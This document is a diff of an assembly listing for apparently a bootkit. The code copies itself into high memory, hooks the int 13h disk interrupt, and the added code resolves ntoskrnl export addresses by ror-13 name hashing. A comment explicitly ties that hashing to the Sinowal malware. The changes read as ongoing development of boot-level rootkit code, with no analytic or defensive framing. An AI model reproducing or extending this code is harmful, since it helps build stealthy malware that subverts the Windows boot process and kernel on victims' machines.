@@ -16,7 +16,7 @@
     16                                  
     17                                  ; now copy this boot application to the end of memory (by default 4 KB size, the reserved size)
     18 00000010 BE007E                  mov si,7e00h
-    19 00000013 66B9[15040000]          mov ecx,Total_End_of_Binary
+    19 00000013 66B9[61040000]          mov ecx,Total_End_of_Binary
     20 00000019 F3A4                    rep movsb
     21                                  
     22                                  ; backup old int 13h vector
@@ -303,7 +303,7 @@
    288 00000235 81C7FF0F0000            add edi,00000FFFh  ; get end of page
    289 0000023B 81E700F0FFFF            and edi,0FFFFF000h  ; page base address
    290 00000241 81EF00080000            sub edi,2048;
-   291 00000247 B918010000              mov ecx,Total_End_of_Binary - Relocate_Me_Code  ; size of further code
+   291 00000247 B964010000              mov ecx,Total_End_of_Binary - Relocate_Me_Code  ; size of further code
    292 0000024C 57                      push edi
    293 0000024D F3A4                    rep movsb
    294 0000024F 5F                      pop edi
@@ -648,10 +648,67 @@
    633 0000040F 31C9                    xor ecx,ecx
    634 00000411 49                      dec ecx  ; ecx = -1 = 0FFFFFFFFh
    635                                  
-   636                                  ;mov esp,ebp 
-   637 00000412 9D                      popfd
-   638 00000413 61                      popad
-   639 00000414 C3                      ret
-   640                                  
-   641                                  Total_End_of_Binary:
-   642 00000415 00<rept>                times 4*1024-($-$$) db 0
+   636                                  ; store the PsLoadedModuleList pointer on stack and resolve hashes
+   637 00000412 EB3D                    jmp short Resolve_Next_Hash_StoreOnStack
+   638                                  
+   639                                  Next_Export:
+   640                                  ;  ecx      export counter
+   641                                  ;  ebx      still base of ntoskrnl image (points to DOS Header)
+   642                                  ;  esi      Export Name
+   643                                  ;  edi      Hash Value
+   644                                  ;  [esp]    Pointer to Next Hash
+   645                                  ;  ebp      Pointer to Stack Variables
+   646 00000414 41                      inc ecx   ; next function to generate hash of (ecx = counter)
+   647 00000415 8B7220                  mov esi,[edx+0x20] ; Export Directory Table.Name Pointer RVA
+   648 00000418 01DE                    add esi,ebx    ;  (absolute address)
+   649 0000041A 8B348E                  mov esi,[esi+ecx*4]   ; lookup the function name in the Name Pointer Table
+   650 0000041D 01DE                    add esi,ebx     ;  (absolute address)
+   651                                  
+   652 0000041F 31C0                    xor eax,eax   ; will hold character (zero extended)
+   653 00000421 31FF                    xor edi,edi   ; will hold hash value
+   654                                  
+   655                                  Generate_Hash_of_Export_Name:
+   656                                  ; generates the hash of the name string, += n >> 13 is used
+   657 00000423 AC                      lodsb
+   658 00000424 08C0                    or al,al  ; zero termination?
+   659 00000426 7407                    jz Hash_Generated 
+   660 00000428 C1CF0D                  ror edi,13   ; >> 13 is used (as in previous Sinowal version!)
+   661 0000042B 01C7                    add edi,eax    ; add to hash value
+   662 0000042D EBF4                    jmp short Generate_Hash_of_Export_Name
+   663                                  
+   664                                  Hash_Generated:
+   665                                  ; krrr
+   666 0000042F 8B3424                  mov esi,[esp]  ; as discussed, [esp] contains pointer to hashes (because of the call)
+   667 00000432 AD                      lodsd   ; get next hash
+   668 00000433 09C0                    or eax,eax 
+   669 00000435 7421                    jz All_Hashes_Resolved    ; if yes exit loop
+   670 00000437 39C7                    cmp edi,eax       ; found correct hash?
+   671 00000439 75D9                    jnz Next_Export   ; if not => next export
+   672 0000043B 893424                  mov [esp],esi     ; update hash pointer
+   673 0000043E 8B7A24                  mov edi,[edx+0x24]  ; Export Directory Table.Ordinal Table RVA
+   674 00000441 01DF                    add edi,ebx    ;   (absolute address)
+   675 00000443 0FB7044F                movzx eax,word [edi+ecx*2]        ; lookup in the Ordinal Table to get number in EAT
+   676 00000447 8B7A1C                  mov edi,[edx+0x1c]     ; Export Directory Table.Export Address Table RVA
+   677 0000044A 01DF                    add edi,ebx                ;   (absolute address)
+   678 0000044C 8B0487                  mov eax,[edi+eax*4]           ; lookup the address
+   679 0000044F 01D8                    add eax,ebx       ; w00t! found the address, store in eax and store as stack variable!
+   680                                  
+   681                                  Resolve_Next_Hash_StoreOnStack:
+   682 00000451 87FD                    xchg edi,ebp    ; edi to point to stack variables
+   683 00000453 AB                      stosd   ; store eax to variable
+   684 00000454 87FD                    xchg edi,ebp  ; ebp points now to next variable...!
+   685 00000456 EBBC                    jmp short Next_Export
+   686                                  
+   687                                  All_Hashes_Resolved:
+   688 00000458 90                      nop
+   689 00000459 08C0                    or al, al
+   690 0000045B 08C0                    or al, al
+   691 0000045D 90                      nop
+   692                                  
+   693                                  ;mov esp,ebp 
+   694 0000045E 9D                      popfd
+   695 0000045F 61                      popad
+   696 00000460 C3                      ret
+   697                                  
+   698                                  Total_End_of_Binary:
+   699 00000461 00<rept>                times 4*1024-($-$$) db 0
